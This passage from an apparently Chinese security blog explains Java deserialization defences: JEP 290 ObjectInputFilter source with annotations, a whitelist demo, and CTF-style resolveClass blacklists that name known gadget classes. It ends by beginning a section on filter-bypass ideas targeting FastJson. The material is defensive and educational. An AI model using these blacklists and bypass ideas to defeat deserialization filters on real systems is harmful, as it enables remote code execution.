数组：先做长度限制，再把（可能是多维的）数组降维到最终的“元素类型” ——</span></span><br><span class="line">        <span class="keyword">if</span> (clazz.isArray()) &#123;</span><br><span class="line">            <span class="comment">// arrayLength &lt; 0 表示“未知长度/不可得”，这种情况下不做长度上限判断</span></span><br><span class="line">            <span class="keyword">if</span> (filterInfo.arrayLength() &gt;= <span class="number">0</span> &amp;&amp; filterInfo.arrayLength() &gt; maxArrayLength) &#123;</span><br><span class="line">                <span class="keyword">return</span> Status.REJECTED;  <span class="comment">// 数组过大，直接拒绝</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 逐层 getComponentType()，直到拿到最内层元素类型（e.g., Foo[][] -&gt; Foo）</span></span><br><span class="line">            <span class="keyword">do</span> &#123;</span><br><span class="line">                clazz = clazz.getComponentType();</span><br><span class="line">            &#125; <span class="keyword">while</span> (clazz.isArray());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// —— ②b 原始类型：不参与“类匹配”，交给其他过滤器或默认策略 ——</span></span><br><span class="line">        <span class="keyword">if</span> (clazz.isPrimitive())  &#123;</span><br><span class="line">            <span class="keyword">return</span> Status.UNDECIDED;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// —— ②c 引用类型：按定义顺序应用各条规则（filters 内是 Function&lt;Class&lt;?&gt;, Status&gt;）</span></span><br><span class="line">            <span class="keyword">final</span> Class&lt;?&gt; cl = clazz; <span class="comment">// for lambda 捕获（必须是 effectively final）</span></span><br><span class="line">            Optional&lt;Status&gt; status = filters.stream()</span><br><span class="line">                    .map(f -&gt; f.apply(cl))              <span class="comment">// 套用单条模式</span></span><br><span class="line">                    .filter(p -&gt; p != Status.UNDECIDED) <span class="comment">// 仅保留“明确结论”</span></span><br><span class="line">                    .findFirst();                       <span class="comment">// 自左向右取第一条命中</span></span><br><span class="line">            <span class="comment">// 若没有任何规则命中，则本过滤器不作决定</span></span><br><span class="line">            <span class="keyword">return</span> status.orElse(Status.UNDECIDED);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// —— ③ 没有类信息的片段：本过滤器不作决定 ——</span></span><br><span class="line">    <span class="keyword">return</span> Status.UNDECIDED;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="自定义过滤器"><a href="#自定义过滤器" class="headerlink" title="自定义过滤器"></a>自定义过滤器</h4><p>前面通过设置全局属性 <code>jdk.serialFilter</code>，创建的是全局过滤器，因为 <code>ObjectInputFilter.Config</code> 类初始化，<code>Global</code> 这个过滤器被创建并赋值给 <code>Config.serialFilter</code>，每次创建 <code>ObjectInputStream</code> 对象都是去拿 <code>Config</code> 的 <code>serialFilter</code> 属性。</p>
<h5 id="局部自定义过滤器"><a href="#局部自定义过滤器" class="headerlink" title="局部自定义过滤器"></a>局部自定义过滤器</h5><p>若想设置局部自定义过滤器，可以调用 <code>ObjectInputStream#setInternalObjectInputFilter</code>，传入自定义的 <code>ObjectInputFilter</code>（JDK9 及以上是 <code>setObjectInputFilter</code>，相应的也有 <code>getObjectInputFilter</code> 用于获取过滤器）。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 为当前输入流设置反序列化过滤器。</span></span><br><span class="line"><span class="comment"> * 过滤器的 &#123;<span class="doctag">@link</span> ObjectInputFilter#checkInput checkInput&#125; 方法会在反序列化过程中</span></span><br><span class="line"><span class="comment"> * 针对流里的每个“类信息”和“对象引用”被调用。过滤器可以检查：要反序列化的类、</span></span><br><span class="line"><span class="comment"> * 数组长度、引用计数、对象图深度，以及输入流已消费的字节数等度量。</span></span><br><span class="line"><span class="comment"> * “深度”指自图根对象开始、到当前正在反序列化对象为止所产生的</span></span><br><span class="line"><span class="comment"> * 嵌套 &#123;<span class="doctag">@linkplain</span> #readObject readObject&#125; 调用层数。</span></span><br><span class="line"><span class="comment"> * “引用计数”是已从流中读取的对象与对象引用的累计数量（含当前要读取的对象）。</span></span><br><span class="line"><span class="comment"> * 仅在从流中“读取对象”时才会触发过滤器；原始类型不触发。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;若过滤器返回 &#123;<span class="doctag">@link</span> ObjectInputFilter.Status#REJECTED Status.REJECTED&#125;、</span></span><br><span class="line"><span class="comment"> * 返回 &#123;<span class="doctag">@code</span> null&#125;，或在执行中抛出 &#123;<span class="doctag">@link</span> RuntimeException&#125;，</span></span><br><span class="line"><span class="comment"> * 则正在运行的 &#123;<span class="doctag">@code</span> readObject&#125; 或 &#123;<span class="doctag">@code</span> readUnshared&#125;</span></span><br><span class="line"><span class="comment"> * 将抛出 &#123;<span class="doctag">@link</span> InvalidClassException&#125;；否则反序列化将继续进行。&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;该流的序列化过滤器在构造 &#123;<span class="doctag">@code</span> ObjectInputStream&#125; 时，会被初始化为</span></span><br><span class="line"><span class="comment"> * &#123;<span class="doctag">@link</span> ObjectInputFilter.Config#getSerialFilter() ObjectInputFilter.Config.getSerialFilter&#125;</span></span><br><span class="line"><span class="comment"> * 的返回值；之后只能“自定义设置”一次。&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@implSpec</span></span></span><br><span class="line"><span class="comment"> * 当过滤器不为 &#123;<span class="doctag">@code</span> null&#125; 时，将在 &#123;<span class="doctag">@link</span> #readObject readObject&#125; 与</span></span><br><span class="line"><span class="comment"> * &#123;<span class="doctag">@link</span> #readUnshared readUnshared&#125; 的过程中，对流中的每个对象（包括普通类或类对象）</span></span><br><span class="line"><span class="comment"> * 调用过滤器。字符串按原始类型对待，因此不会触发过滤器。</span></span><br><span class="line"><span class="comment"> * 过滤器会在以下情形被调用：</span></span><br><span class="line"><span class="comment"> * &lt;ul&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;对流中“先前已反序列化”的每个对象引用（此时 class 为 &#123;<span class="doctag">@code</span> null&#125;，arrayLength 为 -1）；&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;对每个普通类对象（class 非 &#123;<span class="doctag">@code</span> null&#125;，arrayLength 为 -1）；&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;对每个动态代理的接口以及动态代理类本身（class 非 &#123;<span class="doctag">@code</span> null&#125;，arrayLength 为 -1）；&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;对每个数组，使用数组的类型与请求的长度进行过滤（class 为数组类型，arrayLength 为请求长度）；&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;对被其类的 &#123;<span class="doctag">@code</span> readResolve&#125; 方法替换的对象：使用“替换后对象”的类进行过滤；</span></span><br><span class="line"><span class="comment"> *       若替换后为数组，则同时提供 arrayLength，否则为 -1；&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;对被 &#123;<span class="doctag">@link</span> #resolveObject resolveObject&#125; 替换的对象：同上，使用“替换后对象”的类，</span></span><br><span class="line"><span class="comment"> *       若为数组则提供 arrayLength，否则为 -1。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> * &lt;/ul&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 当调用 &#123;<span class="doctag">@link</span> ObjectInputFilter#checkInput checkInput&#125; 时，可获取：</span></span><br><span class="line"><span class="comment"> * 当前类、数组长度、已从流中读取的引用计数、嵌套的 &#123;<span class="doctag">@link</span> #readObject readObject&#125; /</span></span><br><span class="line"><span class="comment"> * &#123;<span class="doctag">@link</span> #readUnshared readUnshared&#125; 调用深度，以及实现相关的“自输入流已读取字节数”。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;每次进入 &#123;<span class="doctag">@link</span> #readObject readObject&#125; 或 &#123;<span class="doctag">@link</span> #readUnshared readUnshared&#125;，</span></span><br><span class="line"><span class="comment"> * 在读取对象之前“深度 +1”，在正常或异常返回前“深度 -1”。深度从 &#123;<span class="doctag">@code</span> 1&#125; 开始，</span></span><br><span class="line"><span class="comment"> * 每遇到嵌套对象递增，嵌套返回时递减。引用计数从 &#123;<span class="doctag">@code</span> 1&#125; 开始，并在读取对象前增加。&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> filter 要设置的过滤器；可为 &#123;<span class="doctag">@code</span> null&#125;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> SecurityException 当存在 SecurityManager 且未授予</span></span><br><span class="line"><span class="comment"> *       &#123;<span class="doctag">@code</span> SerializablePermission(&quot;serialFilter&quot;)&#125; 权限时抛出</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IllegalStateException 当当前（&#123;<span class="doctag">@linkplain</span> #getObjectInputFilter() 已存在的&#125;）过滤器</span></span><br><span class="line"><span class="comment"> *       不是进程范围（全局）过滤器，因而不允许再次设置时抛出</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 9</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">setObjectInputFilter</span><span class="params">(ObjectInputFilter filter)</span> &#123;</span><br><span class="line">    <span class="type">SecurityManager</span> <span class="variable">sm</span> <span class="operator">=</span> System.getSecurityManager();</span><br><span class="line">    <span class="keyword">if</span> (sm != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 需要具备 &quot;serialFilter&quot; 权限，否则抛出 SecurityException</span></span><br><span class="line">        sm.checkPermission(ObjectStreamConstants.SERIAL_FILTER_PERMISSION);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 仅允许“设置一次”：</span></span><br><span class="line">    <span class="comment">// 若当前已存在一个“非全局”的过滤器（即既不为 null，也不等于进程范围过滤器），则禁止再次设置。</span></span><br><span class="line">    <span class="comment">// 允许的情况：当前为 null（从未设置），或当前等于进程范围过滤器（允许用自定义过滤器替换一次）。</span></span><br><span class="line">    <span class="keyword">if</span> (serialFilter != <span class="literal">null</span> &amp;&amp;</span><br><span class="line">            serialFilter != ObjectInputFilter.Config.getSerialFilter()) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;filter can not be set more than once&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 设置（或清空）当前流的过滤器；设为 null 表示恢复使用全局过滤器（若存在）或不使用过滤。</span></span><br><span class="line">    <span class="built_in">this</span>.serialFilter = filter;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>例如下面这个例子通过 <code>ObjectInputStream#setObjectInputFilter</code> 设置由 <code>ObjectInputFilter$Config#createFilter</code> 创建的过滤器阻止反序列化。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Jep290FilterDemo</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 规则：先设资源上限，再白名单（仅放行 java.base 模块 &amp; 你的业务包），最后兜底拒绝</span></span><br><span class="line">    <span class="comment">// - 允许：java.base/*（java.lang/java.util…）</span></span><br><span class="line">    <span class="comment">// - 允许：com.myapp.**（你自己的包）</span></span><br><span class="line">    <span class="comment">// - 其余：!*（全部拒绝）</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">RULE</span> <span class="operator">=</span></span><br><span class="line">            <span class="string">&quot;maxdepth=64;maxrefs=10000;maxbytes=1048576;java.base/*;com.myapp.**;!*&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectInputFilter</span> <span class="variable">filter</span> <span class="operator">=</span> ObjectInputFilter.Config.createFilter(RULE);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ✅ 允许的对象：ArrayList&lt;String&gt;（在 java.base 模块里）</span></span><br><span class="line">        <span class="type">byte</span>[] ok = serialize(<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(Arrays.asList(<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>)));</span><br><span class="line">        System.out.println(<span class="string">&quot;Allowed -&gt; &quot;</span> + deserialize(ok, filter));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ❌ 被拒绝的对象：java.awt.Point（在 java.desktop 模块，不在白名单）</span></span><br><span class="line">        <span class="type">byte</span>[] bad = serialize(<span class="keyword">new</span> <span class="title class_">java</span>.awt.Point(<span class="number">1</span>, <span class="number">2</span>));</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> deserialize(bad, filter);</span><br><span class="line">            System.out.println(<span class="string">&quot;Unexpected: &quot;</span> + o);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvalidClassException e) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Rejected as expected: &quot;</span> + e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="type">byte</span>[] serialize(Serializable obj) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bos)) &#123;</span><br><span class="line">            oos.writeObject(obj);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> bos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> Object <span class="title function_">deserialize</span><span class="params">(<span class="type">byte</span>[] buf, ObjectInputFilter f)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(buf))) &#123;</span><br><span class="line">            ois.setObjectInputFilter(f);             <span class="comment">// ⬅️ 关键：给这个流加过滤器</span></span><br><span class="line">            <span class="keyword">return</span> ois.readObject();                 <span class="comment">// REJECTED 会抛 InvalidClassException</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h5 id="全局自定义过滤器"><a href="#全局自定义过滤器" class="headerlink" title="全局自定义过滤器"></a>全局自定义过滤器</h5><p>全局自定义过滤器可以通过 <code>Config#setSerialFilter</code> 设置，但是为了安全起见只能设置一次。 </p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 设置“进程级（全局）”的反序列化过滤器（仅能设置一次）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> filter 要设置为“进程范围内”的序列化过滤器；不可为 null</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> SecurityException 若存在 SecurityManager 且未授予</span></span><br><span class="line"><span class="comment"> *         &#123;<span class="doctag">@code</span> new SerializablePermission(&quot;serialFilter&quot;)&#125; 权限</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IllegalStateException 若全局过滤器此前已被设置为非 null（只能设置一次）</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setSerialFilter</span><span class="params">(ObjectInputFilter filter)</span> &#123;</span><br><span class="line">    Objects.requireNonNull(filter, <span class="string">&quot;filter&quot;</span>); <span class="comment">// 过滤器不能为空</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如启用了 SecurityManager，需具备设置全局过滤器的专用权限</span></span><br><span class="line">    <span class="type">SecurityManager</span> <span class="variable">sm</span> <span class="operator">=</span> System.getSecurityManager();</span><br><span class="line">    <span class="keyword">if</span> (sm != <span class="literal">null</span>) &#123;</span><br><span class="line">        sm.checkPermission(ObjectStreamConstants.SERIAL_FILTER_PERMISSION);</span><br><span class="line">        <span class="comment">// 等价于：sm.checkPermission(new SerializablePermission(&quot;serialFilter&quot;))</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用专用锁对象保证并发安全，只允许首次成功设置</span></span><br><span class="line">    <span class="keyword">synchronized</span> (serialFilterLock) &#123;</span><br><span class="line">        <span class="keyword">if</span> (serialFilter != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 一旦非空就视为已经设置过，后续再次设置一律非法</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Serial filter can only be set once&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 首次设置成功：将给整个进程内后续的反序列化使用（与每个流上的局部过滤器共同生效）</span></span><br><span class="line">        serialFilter = filter;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="绕过思路"><a href="#绕过思路" class="headerlink" title="绕过思路"></a>绕过思路</h3><p>由于 JEP290 的过滤器默认为空，因此通常对我们反序列造不成什么影响。主要影响还是在 RMI 相关利用上。</p>
<h2 id="重写-resolveClass"><a href="#重写-resolveClass" class="headerlink" title="重写 resolveClass"></a>重写 resolveClass</h2><h3 id="检测原理-1"><a href="#检测原理-1" class="headerlink" title="检测原理"></a>检测原理</h3><p>很多 java 题目会创建一个类继承 <code>ObjectInputStream</code>，并重写其 <code>resolveClass</code> 方法，在里面添加对反序列化类黑名单的校验。比如下面这个：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyObjectInputStream</span> <span class="keyword">extends</span> <span class="title class_">ObjectInputStream</span> &#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] blacklist = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;</span><br><span class="line">           <span class="string">&quot;java\\.security.*&quot;</span>, <span class="string">&quot;java\\.rmi.*&quot;</span>,  <span class="string">&quot;com\\.fasterxml.*&quot;</span>, <span class="string">&quot;com\\.ctf\\.*&quot;</span>,</span><br><span class="line">           <span class="string">&quot;org\\.springframework.*&quot;</span>, <span class="string">&quot;org\\.yaml.*&quot;</span>, <span class="string">&quot;javax\\.management\\.remote.*&quot;</span></span><br><span class="line">   &#125;;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="title function_">MyObjectInputStream</span><span class="params">(InputStream inputStream)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">      <span class="built_in">super</span>(inputStream);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">protected</span> Class <span class="title function_">resolveClass</span><span class="params">(ObjectStreamClass cls)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">      <span class="keyword">if</span>(!contains(cls.getName())) &#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="built_in">super</span>.resolveClass(cls);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(<span class="string">&quot;Unexpected serialized class&quot;</span>, cls.getName());</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">contains</span><span class="params">(String targetValue)</span> &#123;</span><br><span class="line">      <span class="keyword">for</span> (String forbiddenPackage : blacklist) &#123;</span><br><span class="line">         <span class="keyword">if</span> (targetValue.matches(forbiddenPackage))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>或是这样子：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyownObjectInputStream</span> <span class="keyword">extends</span> <span class="title class_">ObjectInputStream</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">ArrayList</span> <span class="variable">Blacklist</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyownObjectInputStream</span><span class="params">(InputStream in)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>(in);</span><br><span class="line">        <span class="built_in">this</span>.Blacklist.add(Hashtable.class.getName());</span><br><span class="line">        <span class="built_in">this</span>.Blacklist.add(HashSet.class.getName());</span><br><span class="line">        <span class="built_in">this</span>.Blacklist.add(JdbcRowSetImpl.class.getName());</span><br><span class="line">        <span class="built_in">this</span>.Blacklist.add(TreeMap.class.getName());</span><br><span class="line">        <span class="built_in">this</span>.Blacklist.add(HotSwappableTargetSource.class.getName());</span><br><span class="line">        <span class="built_in">this</span>.Blacklist.add(XString.class.getName());</span><br><span class="line">        <span class="built_in">this</span>.Blacklist.add(BadAttributeValueExpException.class.getName());</span><br><span class="line">        <span class="built_in">this</span>.Blacklist.add(TemplatesImpl.class.getName());</span><br><span class="line">        <span class="built_in">this</span>.Blacklist.add(ToStringBean.class.getName());</span><br><span class="line">        <span class="built_in">this</span>.Blacklist.add(<span class="string">&quot;com.sun.jndi.ldap.LdapAttribute&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc) <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.Blacklist.contains(desc.getName())) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(<span class="string">&quot;dont do this&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">super</span>.resolveClass(desc);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>当然 <a class="link"   target="_blank" rel="noopener" href="https://github.com/ikkisoft/SerialKiller" >SerialKiller<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 同样也是采用这个思路：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SerialKiller</span>(is, <span class="string">&quot;/etc/serialkiller.conf&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> (String) ois.readObject();</span><br></pre></td></tr></table></figure></div>

<h3 id="绕过思路-1"><a href="#绕过思路-1" class="headerlink" title="绕过思路"></a>绕过思路</h3><h4 id="引用绕过"><a href="#引用绕过" class="headerlink" title="引用绕过"></a>引用绕过</h4><p>这个绕过思路只能绕过在特定类重写 <code>resilveClass</code> 的情况。以 FastJson 为例，该类在重写的 <code>readObject</code> 函数中创建了继承 <code>ObjectInputStream</code> 的 <code>SecureObjectInputStream</code>，也就是说该类下的所有对象反序列化前都需要经过 <code>SecureObjectInputStream#resilveClass</code> 的过滤。</p>
